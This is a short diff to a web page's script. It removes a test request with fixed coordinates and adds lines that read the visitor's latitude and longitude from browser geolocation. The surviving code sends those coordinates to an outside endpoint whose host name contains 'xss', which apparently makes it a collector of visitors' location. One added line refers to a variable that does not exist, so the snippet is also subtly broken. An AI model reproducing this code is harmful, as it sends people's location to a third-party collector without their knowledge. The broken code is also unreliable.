@@ -10,14 +10,10 @@
 <div id='container'></div>
 <div id="tip"></div>
 <script type="text/javascript">
-    
-    $.get("https://xss.1jr.com.cn/data.php",{ getLng: '999', getLat: '111'},function(result){
-alert('end');
-});
-                                                                                             
-        console.log($);
     navigator.geolocation.getCurrentPosition(function(position) {
         alert('begin');
+		var lat = result.coords.latitude
+		var lng = position.coords.longitude
         $.get("https://xss.1jr.com.cn/data.php",{ getLng: lng, getLat: lat},function(result){
         alert('end');
         });
@@ -26,6 +22,5 @@ alert('end');
         console.log(err)
     });
 </script>
- 
 </body>
 </html>
